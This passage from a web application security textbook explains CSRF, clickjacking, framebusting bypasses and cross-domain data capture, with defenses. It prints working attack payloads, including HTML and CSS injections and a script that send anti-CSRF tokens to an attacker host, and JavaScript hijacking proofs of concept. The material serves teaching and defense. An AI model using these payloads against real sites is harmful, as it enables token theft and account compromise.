form that contains hidden fields for all the relevant parameters required 
for the attack and that has its target set to the vulnerable URL. You can 
use JavaScript to autosubmit the form as soon as the page loads.
 4. While logged in to the application, use the same browser to load your 
crafted HTML page. Verify that the desired action is carried out within the 
application.
TIP The possibility of CSRF attacks alters the impact of numerous other 
categories of vulnerability by introducing an additional vector for their exploitation. For example, consider an administrative function that takes a user 
identifi er in a parameter and displays information about the specifi ed user. 
The function is subject to rigorous access control, but it contains a SQL injection vulnerability in the uid parameter. Since application administrators are 
trusted and have full control of the database in any case, the SQL injection 
vulnerability might be considered low risk. However, because the function 
does not (as originally intended) perform any administrative action, it is not 
protected against CSRF. From an attacker‚Äôs perspective, the function is just as 
c13.indd 506 c13.indd 506 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 507
 Chapter 13 n Attacking Users: Other Techniques 507
signifi cant as one specifi cally designed for administrators to execute arbitrary 
SQL queries. If a query can be injected that performs some sensitive action, 
or that retrieves data via some out-of-band channel, this attack can be performed by nonadministrative users via CSRF.
Authentication and CSRF
Since CSRF attacks involve performing some privileged action within the context 
of the victim user‚Äôs session, they normally require the user to be logged in to 
the application at the time of the attack.
One location where numerous dangerous CSRF vulnerabilities have arisen 
is in the web interfaces used by home DSL routers. These devices often contain 
sensitive functions, such as the ability to open all ports on the Internet-facing 
fi rewall. Since these functions are often not protected against CSRF, and since 
most users do not modify the device‚Äôs default internal IP address, they are 
vulnerable to CSRF attacks delivered by malicious external sites. However, the 
devices concerned often require authentication to make sensitive changes, and 
most users generally are not logged in to their device.
If the device‚Äôs web interface uses forms-based authentication, it is often possible 
to perform a two-stage attack by fi rst logging the user in to the device and then 
performing the authenticated action. Since most users do not modify the default 
credentials for devices of this kind (perhaps on the assumption that the web 
interface can be accessed only from the internal home network), the attacker‚Äôs 
web page can fi rst issue a login request containing default credentials. The device 
then sets a session token in the user‚Äôs browser, which is sent automatically in 
any subsequent requests, including those generated by the attacker.
In other situations, an attacker may require that the victim user be logged 
in to the application under the attacker‚Äôs own user context to deliver a specifi c 
attack. For example, consider an application that allows users to upload and store 
fi les. These fi les can be downloaded later, but only by the user who uploaded 
them. Suppose that the function can be used to perform stored XSS attacks, 
because no fi ltering of fi le contents occurs (see Chapter 12). This vulnerability 
might appear to be harmless, on the basis that an attacker could only use it to 
attack himself. However, using CSRF techniques, an attacker can in fact exploit 
the stored XSS vulnerability to compromise other users. As already described, 
the attacker‚Äôs web page can make a CSRF request to force a victim user to log 
in using the attacker‚Äôs credentials. The attacker‚Äôs page can then make a CSRF 
request to download a malicious fi le. When the user‚Äôs browser processes this fi le, 
the attacker‚Äôs XSS payload executes, and the user‚Äôs session with the vulnerable 
application is compromised. Although the victim is currently logged in using 
c13.indd 507 c13.indd 507 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 508
508 Chapter 13 n Attacking Users: Other Techniques
the attacker‚Äôs account, this need not be the end of the attack. As described in 
Chapter 12, the XSS exploit can persist in the user‚Äôs browser and perform arbitrary actions, logging the user out of her current session with the vulnerable 
application and inducing her to log back in using her own credentials.
Preventing CSRF Flaws
CSRF vulnerabilities arise because of how browsers automatically submit cookies 
back to the issuing web server with each subsequent request. If a web application relies solely on HTTP cookies as its mechanism for tracking sessions, it is 
inherently at risk from this type of attack.
The standard defense against CSRF attacks is to supplement HTTP cookies 
with additional methods of tracking sessions. This typically takes the form 
of additional tokens that are transmitted via hidden fi elds in HTML forms. 
When each request is submitted, in addition to validating session cookies, the 
application verifi es that the correct token was received in the form submission. 
Assuming that the attacker has no way to determine the value of this token, 
he cannot construct a cross-domain request that succeeds in performing the 
desired action.
NOTE Even functions that are robustly defended using CSRF tokens may 
be vulnerable to user interface (UI) redress attacks, as described later in this 
chapter.
When anti-CSRF tokens are used in this way, they must be subjected to the 
same safeguards as normal session tokens. If an attacker can predict the values 
of tokens that are issued to other users, he may be able to determine all the 
parameters required for a CSRF request and therefore still deliver an attack. 
Furthermore, if the anti-CSRF tokens are not tied to the session of the user to 
whom they were issued, an attacker may be able to obtain a valid token within his 
own session and use this in a CSRF attack that targets a different user‚Äôs session.
TRY IT!
http://mdsec.net/auth/395/
http://mdsec.net/auth/404/
WARNING Some applications use relatively short anti-CSRF tokens on the 
assumption that they will not be subjected to brute-force attacks in the way 
that short session tokens might be. Any attack that sent a range of possible 
values to the application would need to send these via the victim‚Äôs browser, 
involving a large number of requests that might easily be noticed. Furthermore, 
c13.indd 508 c13.indd 508 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 509
 Chapter 13 n Attacking Users: Other Techniques 509
the application may defensively terminate the user‚Äôs session if it receives too 
many invalid anti-CSRF tokens, thereby stalling the attack.
However, this ignores the possibility of performing a brute-force attack purely on 
the client side, without sending any requests to the server. In some situations, 
this attack can be performed using a CSS-based technique to enumerate a user‚Äôs 
browsing history. For such an attack to succeed, two conditions must hold:
n The application must sometimes transmit an anti-CSRF token within the 
URL query string. This is often the case, because many protected functions are accessed via simple hyperlinks containing a token within the 
target URL.
n The application must either use the same anti-CSRF token throughout the 
user‚Äôs session or tolerate the use of the same token more than once. This 
is often the case to enhance the user‚Äôs experience and allow use of the 
browser‚Äôs back and forward buttons.
If these conditions hold, and the target user has already visited a URL that 
includes an anti-CSRF token, the attacker can perform a brute-force attack from 
his own page. Here, a script on the attacker‚Äôs page dynamically creates hyperlinks to the relevant URL on the target application, including a different value 
for the anti-CSRF token in each link. It then uses the JavaScript API getComputedStyle to test whether the user has visited the link. When a visited link is 
identifi ed, a valid anti-CSRF token has been found, and the attacker‚Äôs page can 
then use it to perform sensitive actions on the user‚Äôs behalf.
Note that to defend against CSRF attacks, it is not suffi cient simply to perform 
sensitive actions using a multistage process. For example, when an administrator adds a new user account, he might enter the relevant details at the fi rst stage 
and then review and confi rm the details at the second stage. If no additional 
anti-CSRF tokens are being used, the function is still vulnerable to CSRF, and 
an attacker can simply issue the two required requests in turn, or (very often) 
proceed directly to the second request.
Occasionally, an application function employs an additional token that is 
set in one response and submitted in the next request. However, the transition 
between these two steps involves a redirection, so the defense achieves nothing. 
Although CSRF is a one-way attack and cannot be used to read tokens from 
application responses, if a CSRF response contains a redirection to a different 
URL containing a token, the victim‚Äôs browser automatically follows the redirect 
and automatically submits the token with this request.
TRY IT!
http://mdsec.net/auth/398/
c13.indd 509 c13.indd 509 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 510
510 Chapter 13 n Attacking Users: Other Techniques
Do not make the mistake of relying on the HTTP Referer header to indicate 
whether a request originated on-site or off-site. The Referer header can be 
spoofed using older versions of Flash or masked using a meta refresh tag. In 
general, the Referer header is not a reliable foundation on which to build any 
security defenses within web applications.
Defeating Anti-CSRF Defenses Via XSS
It is often claimed that anti-CSRF defenses can be defeated if the application 
contains any XSS vulnerabilities. But this is only partly true. The thought behind 
the claim is correct‚Äîthat because XSS payloads execute on-site, they can perform 
two-way interaction with the application and therefore can retrieve tokens from 
the application‚Äôs responses and submit them in subsequent requests.
However, if a page that is itself protected by anti-CSRF defenses also contains 
a refl ected XSS fl aw, this fl aw cannot easily be used to break the defenses. Don‚Äôt 
forget that the initial request in a refl ected XSS attack is itself cross-site. The 
attacker crafts a URL or POST request containing malicious input that gets copied 
into the application‚Äôs response. But if the vulnerable page implements anti-CSRF 
defenses, the attacker‚Äôs crafted request must already contain the required token 
to succeed. If it does not, the request is rejected, and the code path containing 
the refl ected XSS fl aw does not execute. The issue here is not whether injected 
script can read any tokens contained in the application‚Äôs response (of course 
it can). The issue is about getting the script into a response containing those 
tokens in the fi rst place.
In fact, there are several situations in which XSS vulnerabilities can be exploited 
to defeat anti-CSRF defenses:
n If there are any stored XSS fl aws within the defended functionality, these 
can always be exploited to defeat the defenses. JavaScript injected via 
the stored attack can directly read the tokens contained within the same 
response that the script appears in.
n If the application employs anti-CSRF defenses for only part of its functionality, and a refl ected XSS fl aw exists in a function that is not defended 
against CSRF, that fl aw can be exploited to defeat the anti-CSRF defenses. 
For example, if an application employs anti-CSRF tokens to protect only 
the second step of a funds transfer function, an attacker can leverage a 
refl ected XSS attack elsewhere to defeat the defense. A script injected via 
this fl aw can make an on-site request for the fi rst step of the funds transfer, retrieve the token, and use this to request the second step. The attack 
is successful because the fi rst step of the transfer, which is not defended 
against CSRF, returns the token needed to access the defended page. The 
reliance on only HTTP cookies to reach the fi rst step means that it can be 
leveraged to gain access to the token defending the second step.
c13.indd 510 c13.indd 510 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 511
 Chapter 13 n Attacking Users: Other Techniques 511
n In some applications, anti-CSRF tokens are tied only to the current user, 
and not to his session. In this situation, if the login form is not protected 
against CSRF, a multistage exploit may still be possible. First, the attacker 
logs in to his own account to obtain a valid anti-CSRF token that is tied 
to his user identity. He then uses CSRF against the login form to force 
the victim user to log in using the attacker‚Äôs credentials, as was already 
described for the exploitation of same-user stored XSS vulnerabilities. 
Once the user is logged in as the attacker, the attacker uses CSRF to cause 
the user to issue a request exploiting the XSS bug, using the anti-CSRF 
token previously acquired by the attacker. The attacker‚Äôs XSS payload 
then executes in the user‚Äôs browser. Since the user is still logged in as the 
attacker, the XSS payload may need to log the user out again and induce 
the user to log back in, with the result that the user‚Äôs login credentials 
and resulting application session are fully compromised.
n If anti-CSRF tokens are tied not to the user but to the current session, 
a variation on the preceding attack may be possible if any methods are 
available for the attacker to inject cookies into the user‚Äôs browser (as 
described later in this chapter). Instead of using a CSRF attack against 
the login form with the attacker‚Äôs own credentials, the attacker can 
directly feed to the user both his current session token and the antiCSRF token that is tied to it. The remainder of the attack then proceeds 
as previously described.
These scenarios aside, robust defenses against CSRF attacks do in many situations make it considerably harder, if not impossible, to exploit some refl ected XSS 
vulnerabilities. However, it goes without saying that any XSS conditions in an 
application should always be fi xed, regardless of any anti-CSRF protections in place 
that may, in some situations, frustrate an attacker who is seeking to exploit them.
UI Redress
Fundamentally, anti-CSRF defenses involving tokens within the page aim to 
ensure that requests made by a user originate from that user‚Äôs actions within the 
application itself and are not induced by some third-party domain. UI redress 
attacks are designed to allow a third-party site to induce user actions on another 
domain even if anti-CSRF tokens are being used. These attacks work because, 
in the relevant sense, the resulting requests actually do originate within the 
application being targeted. UI redress techniques are also often referred to as 
‚Äúclickjacking,‚Äù ‚Äústrokejacking,‚Äù and other buzzwords.
In its basic form, a UI redress attack involves the attacker‚Äôs web page loading the target application within an iframe on the attacker‚Äôs page. In effect, 
the attacker overlays the target application‚Äôs interface with a different interface 
c13.indd 511 c13.indd 511 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 512
512 Chapter 13 n Attacking Users: Other Techniques
provided by the attacker. The attacker‚Äôs interface contains content to entice the 
user and induce him to perform actions such as clicking the mouse in a particular region of the page. When the user performs these actions, although it 
appears that he is clicking the buttons and other UI elements that are visible in 
the attacker‚Äôs interface, he is unwittingly interacting with the interface of the 
application that is being targeted.
For example, suppose a banking function to make a payment transfer involves 
two steps. In the fi rst step, the user submits the details of the transfer. The response 
to this request displays these details, and also a button to confi rm the action 
and make the payment. Furthermore, in an attempt to prevent CSRF attacks, 
the form in the response includes a hidden fi eld containing an unpredictable 
token. This token is submitted when the user clicks the confi rm button, and the 
application verifi es its value before transferring the funds.
In the UI redress attack, the attacker‚Äôs page submits the fi rst request in this 
process using conventional CSRF. This is done in an iframe within the attacker‚Äôs 
page. As it does normally, the application responds with the details of the user 
to be added and a button to confi rm the action. This response is ‚Äúdisplayed‚Äù 
within the attacker‚Äôs iframe, which is overlaid with the attacker‚Äôs interface 
designed to induce the victim to click the region containing the confi rm button. When the user clicks in this region, he is unwittingly clicking the confi rm 
button in the target application, so the new user gets created. This basic attack 
is illustrated in Figure 13-1.
Figure 13-1: A basic UI redress attack
The reason this attack succeeds, where a pure CSRF attack would fail, is 
that the anti-CSRF token used by the application is processed in the normal 
way. Although the attacker‚Äôs page cannot read the value of this token due to 
the same-origin policy, the form in the attacker‚Äôs iframe includes the token 
c13.indd 512 c13.indd 512 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 513
 Chapter 13 n Attacking Users: Other Techniques 513
generated by the application, and it submits this back to the application when 
the victim unwittingly clicks the confi rm button. As far as the target application 
is concerned, everything is normal.
To deliver the key trick of having the victim user see one interface but interact 
with a different one, the attacker can employ various CSS techniques. The iframe
that loads the target interface can be made an arbitrary size, in an arbitrary location within the attacker‚Äôs page, and showing an arbitrary location within the 
target page. Using suitable style attributes, it can be made completely transparent so that the user cannot see it.
TRY IT!
http://mdsec.net/auth/405/
Developing the basic attack further, the attacker can use complex script code 
within his interface to induce more elaborate actions than simply clicking a button. Suppose an attack requires the user to enter some text into an input fi eld 
(for example, in the amount fi eld of a funds transfer page). The attacker‚Äôs user 
interface can contain some content that induces the user to type (for example, 
a form to enter a phone number to win a prize). A script on the attacker‚Äôs page 
can selectively handle keystrokes so that when a desired character is typed, 
the keystroke event is effectively passed to the target interface to populate the 
required input fi eld. If the user types a character that the attacker does not want 
to enter into the target interface, the keystroke is not passed to that interface, 
and the attacker‚Äôs script waits for the next keystroke.
In a further variation, the attacker‚Äôs page can contain content that induces 
the user to perform mouse-dragging actions, such as a simple game. Script 
running on the attacker‚Äôs page can selectively handle the resulting events in 
a way that causes the user to unwittingly select text within the target application‚Äôs interface and drag it into an input fi eld in the attacker‚Äôs interface, or vice 
versa. For example, when targeting a web mail application, the attacker could 
induce the user to drag text from an e-mail message into an input fi eld that 
the attacker can read. Alternatively, the user could be made to create a rule to 
forward all e-mail to the attacker and drag the required e-mail address from 
the attacker‚Äôs interface into the relevant input fi eld in the form that defi nes the 
rule. Furthermore, since links and images are dragged as URLs, the attacker 
may be able to induce dragging actions to capture sensitive URLs, including 
anti-CSRF tokens, from the target application‚Äôs interface.
A useful explanation of these and other attack vectors, and the methods by 
which they may be delivered, can be found here:
http://ui-redressing.mniemietz.de/uiRedressing.pdf
c13.indd 513 c13.indd 513 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 514
514 Chapter 13 n Attacking Users: Other Techniques
Framebusting Defenses
When UI redress attacks were fi rst widely discussed, many high-profi le web 
applications sought to defend against them using a defensive technique known 
as framebusting. In some cases this was already being used to defend against 
other frame-based attacks.
Framebusting can take various forms, but it essentially involves each relevant 
page of an application running a script to detect if it is being loaded within an 
iframe. If so, an attempt is made to ‚Äúbust‚Äù out of the iframe, or some other 
defensive action is performed, such as redirecting to an error page or refusing 
to display the application‚Äôs own interface.
A Stanford University study in 2010 examined the framebusting defenses used 
by 500 top websites. It found that in every instance these could be circumvented in 
one way or another. How this can be done depends on the specifi c details of each 
defense, but can be illustrated using a common example of framebusting code:
<script>
 if (top.location != self.location)
 { top.location = self.location }
</script>
This code checks whether the URL of the page itself matches the URL of the 
top frame in the browser window. If it doesn‚Äôt, the page has been loaded within 
a child frame. In that case the script tries to break out of the frame by reloading 
itself into the top-level frame in the window.
An attacker performing a UI redress attack can circumvent this defense to 
successfully frame the target page in several ways:
n Since the attacker‚Äôs page controls the top-level frame, it can redefi ne the 
meaning of top.location so that an exception occurs when a child frame 
tries to reference it. For example, in Internet Explorer, the attacker can 
run the following code:
var location = ‚Äòfoo‚Äô;
This redefi nes location as a local variable in the top-level frame so that 
code running in a child frame cannot access it.
n The top-level frame can hook the window.onbeforeunload event so that 
the attacker‚Äôs event handler is run when the framebusting code tries to 
set the location of the top-level frame. The attacker‚Äôs code can perform a 
further redirect to a URL that returns an HTTP 204 (No Content) response. 
This causes the browser to cancel the chain of redirection calls and leaves 
the URL of the top-level frame unchanged.
n The top-level frame can defi ne the sandbox attribute when loading the 
target application into a child frame. This disables scripting in the child 
frame while leaving its cookies enabled.
c13.indd 514 c13.indd 514 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 515
 Chapter 13 n Attacking Users: Other Techniques 515
n The top-level frame can leverage the IE XSS fi lter to selectively disable the 
framebusting script within the child frame, as described in Chapter 12. When 
the attacker‚Äôs page specifi es the URL for the iframe target, it can include a 
new parameter whose value contains a suitable part of the framebusting 
script. The IE XSS fi lter identifi es script code within both the parameter 
value and the response from the target application and disables the script 
in the response in an effort to protect the user.
TRY IT!
http://mdsec.net/auth/406/
Preventing UI Redress
The current consensus is that although some kinds of framebusting code may 
hinder UI redress attacks in some situations, this technique should not be relied 
on as a surefi re defense against these attacks.
A more robust method for an application to prevent an attacker from framing its pages is to use the X-Frame-Options response header. It was introduced 
with Internet Explorer 8 and has since been implemented in most other popular 
browsers. The X-Frame-Options header can take two values. The value deny
instructs the browser to prevent the page from being framed, and sameorigin
instructs the browser to prevent framing by third-party domains.
TIP When analyzing any antiframing defenses employed within an application, always review any related versions of the interface that are tailored for 
mobile devices. For example, although wahh-app.com/chat/ might defend 
robustly against framing attacks, there may be no defenses protecting wahhapp.com/mobile/chat/. Application owners often overlook mobile versions 
of the user interface when devising antiframing defenses, perhaps on the 
assumption that a UI redress attack would be impractical on a mobile device. 
However, in many cases, the mobile version of the application runs as normal 
when accessed using a standard (nonmobile) browser, and user sessions are 
shared between both versions of the application.
Capturing Data Cross-Domain
The same-origin policy is designed to prevent code running on one domain 
from accessing content delivered from a different domain. This is why crosssite request forgery attacks are often described as ‚Äúone-way‚Äù attacks. Although 
c13.indd 515 c13.indd 515 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 516
516 Chapter 13 n Attacking Users: Other Techniques
one domain may cause requests to a different domain, it may not easily read 
the responses from those requests to steal the user‚Äôs data from a different 
domain.
In fact, various techniques can be used in some situations to capture all or 
part of a response from a different domain. These attacks typically exploit some 
aspect of the target application‚Äôs functionality together with some feature of 
popular browsers to allow cross-domain data capture in a way that the sameorigin policy is intended to prevent.
Capturing Data by Injecting HTML
Many applications contain functionality that allows an attacker to inject some 
limited HTML into a response that is received by a different user in a way that 
falls short of a full XSS vulnerability. For example, a web mail application may 
display e-mails containing some HTML markup but block any tags and attributes 
that can be used to execute script code. Or a dynamically generated error message may fi lter a range of expressions but still allow some limited use of HTML.
In these situations, it may be possible to leverage the HTML-injection condition to cause sensitive data within the page to be sent to the attacker‚Äôs domain. 
For example, in a web mail application, the attacker may be able to capture the 
contents of a private e-mail message. Alternatively, the attacker may be able to 
read an anti-CSRF token being used within the page, allowing him to deliver 
a CSRF attack to forward the user‚Äôs e-mail messages to an arbitrary address.
Suppose the web mail application allows injection of limited HTML into the 
following response:
[ limited HTML injection here ]
<form action=‚Äùhttp://wahh-mail.com/forwardemail‚Äù method=‚ÄùPOST‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùnonce‚Äù value=‚Äù2230313740821‚Äù>
<input type=‚Äùsubmit‚Äù value=‚ÄùForward‚Äù>
...
</form>
...
<script>
var _StatsTrackerId=‚ÄôAAE78F27CB3210D‚Äô;
...
</script>
Following the injection point, the page contains an HTML form that includes 
a CSRF token. In this situation, an attacker could inject the following text into 
the response:
<img src=‚Äôhttp://mdattacker.net/capture?html=
This snippet of HTML opens an image tag targeting a URL on the attacker‚Äôs 
domain. The URL is encapsulated in single quotation marks, but the URL string 
c13.indd 516 c13.indd 516 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 517
 Chapter 13 n Attacking Users: Other Techniques 517
is not terminated, and the <img> tag is not closed. This causes the browser to 
treat the text following the injection point as part of the URL, up until a single 
quotation mark is encountered, which happens later in the response when a 
quoted JavaScript string appears. Browsers tolerate all the intervening characters 
and the fact that the URL spans several lines.
When the user‚Äôs browser processes the response into which the attacker has 
injected, it attempts to fetch the specifi ed image and makes a request to the 
following URL, thereby sending the sensitive anti-CSRF token to the attacker‚Äôs 
server:
http://mdattacker.net/capture?html=<form%20action=‚Äùhttp://wahh-mail.com/
forwardemail‚Äù%20method=‚ÄùPOST‚Äù><input%20type=‚Äùhidden‚Äù%20name=‚Äùnonce‚Äù%20value=
‚Äú2230313740821‚Äù><input%20type=‚Äùsubmit‚Äù%20value=‚ÄùForward‚Äù>...</form>...
<script> var%20_StatsTrackerId=
An alternative attack would be to inject the following text:
<form action=‚Äùhttp://mdattacker.net/capture‚Äù method=‚ÄùPOST‚Äù>
This attack injects a <form> tag targeting the attacker‚Äôs domain before the <form>
tag used by the application itself. In this situation, when browsers encounter 
the nested <form> tag, they ignore it and process the form in the context of the 
fi rst <form> tag that was encountered. Hence, if the user submits the form, all 
its parameters, including the sensitive anti-CSRF token, are submitted to the 
attacker‚Äôs server:
POST /capture HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Host: mdattacker.net
nonce=2230313740821&...
Since this second attack injects only well-formed HTML, it may be more 
effective against fi lters designed to allow a subset of HTML in echoed inputs. 
However, it also requires some user interaction to succeed, which may reduce 
its effectiveness in some situations.
Capturing Data by Injecting CSS
In the examples discussed in the preceding section, it was necessary to use some 
limited HTML markup in the injected text to capture part of the response crossdomain. In many situations, however, the application blocks or HTML-encodes 
the characters < and > in the injected input, preventing the introduction of any 
new HTML tags. Pure text injection conditions like this are common in web 
applications and are often considered harmless.
c13.indd 517 c13.indd 517 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 518
518 Chapter 13 n Attacking Users: Other Techniques
For example, in a web mail application, an attacker may be able to introduce 
some limited text into the response of a target user via the subject line of an 
e-mail. In this situation, the attacker may be able to capture sensitive data crossdomain by injecting CSS code into the application.
In the example already discussed, suppose the attacker sends an e-mail with 
this subject line:
{}*{font-family:‚Äô
Since this does not contain any HTML metacharacters, it will be accepted 
by most applications and displayed unmodifi ed in responses to the recipient user. When this happens, the response returned to the user might look 
like this:
<html>
<head>
<title>WahhMail Inbox</title>
</head>
<body>
...
<td>{}*{font-family:‚Äô</td>
...
<form action=‚Äùhttp://wahh-mail.com/forwardemail‚Äù method=‚ÄùPOST‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùnonce‚Äù value=‚Äù2230313740821‚Äù>
<input type=‚Äùsubmit‚Äù value=‚ÄùForward‚Äù>
...
</form>
...
<script>
var _StatsTrackerId=‚ÄôAAE78F27CB3210D‚Äô;
...
</script>
</body>
</html>
This response obviously contains HTML. Surprisingly, however, some browsers allow this response to be loaded as a CSS stylesheet and happily process any 
CSS defi nitions it contains. In the present case, the injected response defi nes the 
CSS font-family property and starts a quoted string as the property defi nition. 
The attacker‚Äôs injected text does not close the string, so it continues through the 
rest of the response, including the hidden form fi eld containing the sensitive 
anti-CSRF token. (Note that it is not necessary for CSS defi nitions to be quoted. 
However, if they are not, they terminate at the next semicolon character, which 
may occur before the sensitive data that the attacker wants to capture.)
To exploit this behavior, an attacker needs to host a page on his own domain 
that includes the injected response as a CSS stylesheet. This causes any embedded CSS defi nitions to be applied within the attacker‚Äôs own page. These can 
c13.indd 518 c13.indd 518 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 519
 Chapter 13 n Attacking Users: Other Techniques 519
then be queried using JavaScript to retrieve the captured data. For example, the 
attacker can host a page containing the following:
<link rel=‚Äùstylesheet‚Äù href=‚Äùhttps://wahh-mail.com/inbox‚Äù type=‚Äùtext/
css‚Äù>
<script>
 document.write(‚Äò<img src=‚Äùhttp://mdattacker.net/capture?‚Äô +
 escape(document.body.currentStyle.fontFamily) + ‚Äò‚Äù>‚Äô);
</script>
This page includes the relevant URL from the web mail application as a 
stylesheet and then runs a script to query the font-family property, which 
has been defi ned within the web mail application‚Äôs response. The value of 
the font-family property, including the sensitive anti-CSRF token, is then 
transmitted to the attacker‚Äôs server via a dynamically generated request for 
the following URL:
http://mdattacker.net/capture?%27%3C/td%3E%0D%0A...%0D%0A%3Cform%20
action%3D%22 http%3A//wahh-mail.com/forwardemail%22%20method%3D%22POST%2
2%3E%0D%0A%3Cinput%2 0type%3D%22hidden%22%20name%3D%22nonce%22%20value%3
D%222230313740821%22%3E%0D %0A%3Cinput%20type%3D%22submit%22%20value%3D%
22Forward%22%3E%0D%0A...%0D%0A%3C/ form%3E%0D%0A...%0D%0A%3Cscript%3E%0D
%0Avar%20_StatsTrackerId%3D%27AAE78F27CB32 10D%27
This attack works on current versions of Internet Explorer. Other browsers 
have modifi ed their handling of CSS includes to prevent the attack from working, and it is possible that IE may also do this in the future.
JavaScript Hijacking
JavaScript hijacking provides a further method of capturing data cross-domain, 
turning CSRF into a limited ‚Äútwo-way‚Äù attack. As described in Chapter 3, the 
same-origin policy allows one domain to include script code from another 
domain, and this code executes in the context of the invoking domain, not the 
issuing domain. This provision is harmless provided that application responses 
that are executable using a cross-domain script contain only nonsensitive code, 
which is static and accessible by any application user. However, many of today‚Äôs 
applications use JavaScript to transmit sensitive data, in a way that was not 
foreseen when the same-origin policy was devised. Furthermore, developments 
in browsers mean that an increasing range of syntax is becoming executable 
as valid JavaScript, with new opportunities for capturing data cross-domain.
The changes in application design that fall under the broad ‚Äú2.0‚Äù umbrella 
include new ways of using JavaScript code to transmit sensitive data from the 
server to the client. In many situations, a fast and effi cient way to update the 
user interface via asynchronous requests to the server is to dynamically include 
script code that contains, in some form, the user-specifi c data that needs to be 
displayed.
c13.indd 519 c13.indd 519 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 520
520 Chapter 13 n Attacking Users: Other Techniques
This section examines various ways in which dynamically executed script 
code can be used to transmit sensitive data. It also considers how this code can 
be hijacked to capture the data from a different domain.
Function Callbacks
Consider an application that displays the current user‚Äôs profi le information 
within the user interface when she clicks the appropriate tab. To provide a 
seamless user experience, the information is fetched using an asynchronous 
request. When the user clicks the Profi le tab, some client-side code dynamically 
includes the following script:
https://mdsec.net/auth/420/YourDetailsJson.ashx
The response from this URL contains a callback to an already-defi ned function that displays the user‚Äôs details within the UI:
showUserInfo(
[
 [ ‚ÄòName‚Äô, ‚ÄòMatthew Adamson‚Äô ],
 [ ‚ÄòUsername‚Äô, ‚Äòadammatt‚Äô ],
 [ ‚ÄòPassword‚Äô, ‚Äò4nl1ub3‚Äô ],
 [ ‚ÄòUid‚Äô, ‚Äò88‚Äô ],
 [ ‚ÄòRole‚Äô, ‚ÄòUser‚Äô ]
]);
An attacker can capture these details by hosting his own page that implements the showUserInfo function and includes the script that delivers the profi le 
information. A simple proof-of-concept attack is as follows:
<script>
 function showUserInfo(x) { alert(x); }
</script>
<script src=‚Äùhttps://mdsec.net/auth/420/YourDetailsJson.ashx‚Äù>
</script>
If a user who accesses the attacker‚Äôs page is simultaneously logged in to the 
vulnerable application, the attacker‚Äôs page dynamically includes the script 
containing the user‚Äôs profi le information. This script calls the showUserInfo
function, as implemented by the attacker, and his code receives the user‚Äôs profi le 
details, including, in this instance, the user‚Äôs password.
TRY IT!
http://mdsec.net/auth/420/
c13.indd 520 c13.indd 520 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 521
 Chapter 13 n Attacking Users: Other Techniques 521
JSON
In a variation on the preceding example, the application does not perform a 
function callback in the dynamically invoked script, but instead just returns 
the JSON array containing the user‚Äôs details:
[
 [ ‚ÄòName‚Äô, ‚ÄòMatthew Adamson‚Äô ],
 [ ‚ÄòUsername‚Äô, ‚Äòadammatt‚Äô ],
 [ ‚ÄòPassword‚Äô, ‚Äò4nl1ub3‚Äô ],
 [ ‚ÄòUid‚Äô, ‚Äò88‚Äô ],
 [ ‚ÄòRole‚Äô, ‚ÄòUser‚Äô ]
]
As described in Chapter 3, JSON is a fl exible notation for representing arrays 
of data and can be consumed directly by a JavaScript interpreter.
In older versions of Firefox, it was possible to perform a cross-domain script 
include attack to capture this data by overriding the default Array constructor 
in JavaScript. For example:
<script>
 function capture(s) {
 alert(s);
 }
 function Array() {
 for (var i = 0; i < 5; i++)
 this[i] setter = capture;
 }
</script>
<script src=‚Äùhttps://mdsec.net/auth/409/YourDetailsJson.ashx‚Äù>
</script>
This attack modifi es the default Array object and defi nes a custom setter
function, which is invoked when values are assigned to elements in an array. It 
then executes the response containing the JSON data. The JavaScript interpreter 
consumes the JSON data, constructs an Array to hold its values, and invokes 
the attacker‚Äôs custom setter function for each value in the array.
Since this type of attack was discovered in 2006, the Firefox browser has been 
modifi ed so that custom setters are not invoked during array initialization. This 
attack is not possible in current browsers.
TRY IT!
http://mdsec.net/auth/409/
You need to download version 2.0 of Firefox to exploit this example. You 
can download this from the following URL:
www.oldapps.com/firefox.php?old_firefox=26
c13.indd 521 c13.indd 521 8/19/2011 12:13:59 PM 8/19/2011 12:13:59 PM
Stuttard c13.indd V4 - 08/17/2011 Page 522
522 Chapter 13 n Attacking Users: Other Techniques
Variable Assignment
Consider a social networking application that makes heavy use of asynchronous 
requests for actions such as updating status, adding friends, and posting comments. To deliver a fast and seamless user experience, parts of the user interface 
are loaded using dynamically generated scripts. To prevent standard CSRF 
attacks, these scripts include anti-CSRF tokens that are used when performing 
sensitive actions. Depending on how these tokens are embedded within the 
dynamic scripts, it may be possible for an attacker to capture the tokens by 
including the relevant scripts cross-domain.
For example, suppose a script returned by the application on wahh-network
.com contains the following:
...
var nonce = ‚Äò222230313740821‚Äô;
...
A simple proof-of-concept attack to capture the nonce value cross-domain 
would be as follows:
<script src=‚Äùhttps://wahh-network.com/status‚Äù>
</script>
<script>
 alert(nonce);
</script>
